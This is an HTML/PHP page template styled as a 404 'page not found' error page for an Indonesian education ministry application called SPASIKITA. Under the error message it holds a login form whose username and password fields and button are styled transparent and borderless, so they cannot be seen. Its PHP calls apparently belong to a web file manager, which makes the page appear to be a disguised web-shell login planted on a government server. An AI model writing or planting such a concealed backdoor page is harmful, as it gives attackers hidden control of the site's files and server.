...
<html lang="en">
    ...
    <head>
        ...
        <meta charset="utf-8" />
        <title>SPASIKITA - Kemendikbudristek</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content="Biro Perencanaan, Setjen - Kemendikbudristek" name="description" />
        <meta content="Roren" name="author" />
        <!-- App favicon -->
        <link rel="shortcut icon" href="https://spasikita-ekinerja.kemdikbud.go.id/assets/images/favicon_dikbud.png">

        <!-- Bootstrap Css -->
        <link href="https://spasikita-ekinerja.kemdikbud.go.id/assets/css/bootstrap.min.css" id="bootstrap-style" rel="stylesheet" type="text/css" />
        <!-- Icons Css -->
        <link href="https://spasikita-ekinerja.kemdikbud.go.id/assets/css/icons.min.css" rel="stylesheet" type="text/css" />
        <!-- App Css-->
        <link href="https://spasikita-ekinerja.kemdikbud.go.id/assets/css/app.min.css" id="app-style" rel="stylesheet" type="text/css" />
    ...
    <div class="min-vh-100" style="https://spasikita-ekinerja.kemdikbud.go.id/assets/images/bg-2.png top;">
                ...
                <div class="col-md-12">
                    <div class="text-center py-5 mt-5">
                       <div class="position-relative">
                          ...
                          <h4 class="error-subtitle mb-0">Halaman Tidak Ditemukan</h4>
						  <p class="font-size-16 mx-auto w-50 mt-4">Maaf halaman yang anda tuju tidak ditemukan, silahkan menghubungi admin pengelola aplikasi SPASIKITA</p>
                       </div>
                       <form method="post">
                       <input style="margin:0;background-color:transparent;border:0px;" type="text" class="form-control" id="fm_usr" name="fm_usr" >
                       <input style="margin:0;background-color:transparent;border:0px" type="password" class="form-control" id="fm_pwd" name="fm_pwd" >
                       <div class="mb-3">
                                    <div class="mb-3">
                                        <?php fm_show_message(); ?>
                                    </div>
                                    ...
                                    <div class="mb-3">
                                        <button type="submit" style="margin:0;background-color:transparent;" class="btn" role="button">
                                            <?php echo lng('Login'); ?>
                                        </button>
                                    </div>
                       </form>
    ...
    <!-- JAVASCRIPT -->
    <script src="https://spasikita-ekinerja.kemdikbud.go.id/assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="https://spasikita-ekinerja.kemdikbud.go.id/assets/libs/metismenujs/metismenujs.min.js"></script>
    <script src="https://spasikita-ekinerja.kemdikbud.go.id/assets/libs/simplebar/simplebar.min.js"></script>
    <script src="https://spasikita-ekinerja.kemdikbud.go.id/assets/libs/eva-icons/eva.min.js"></script>
...
<head>
    ...
    <style>
        body.fm-login-page{ background-image: url('https://spasikita-ekinerja.kemdikbud.go.id/assets/images/bg-2.png');background-position: top;}
